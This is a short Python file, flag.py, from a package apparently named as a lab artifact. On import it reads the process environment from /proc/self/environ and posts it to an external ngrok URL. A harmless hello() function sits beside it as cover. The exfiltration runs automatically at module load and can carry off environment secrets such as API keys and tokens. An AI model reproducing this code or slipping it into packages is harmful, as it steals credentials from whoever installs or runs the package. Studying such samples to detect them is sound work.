# artifact_lab_3_package_76a351f5/flag.py
import os
import requests

def send_environ_to_server():
    try:
        # Tenta ler o conteúdo de /proc/self/environ
        with open('/proc/self/environ', 'rb') as f:
            environ_data = f.read().decode('utf-8').replace('\x00', '\n')
        
        # Preparar os dados para envio
        url = "https://218e-67-205-141-215.ngrok-free.app/log"
        data = {'environment': environ_data}
        
        # Enviar os dados para o servidor
        try:
            response = requests.post(url, data=data)
            print(f"Server responded with status code: {response.status_code}")
        except Exception as e:
            print(f"Failed to send environment variables: {e}")
    
    except FileNotFoundError:
        print("Warning: /proc/self/environ not found. Skipping environment variable extraction.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

# Envia as variáveis de ambiente ao executar o script
send_environ_to_server()

def hello():
    print("Hello, World!")

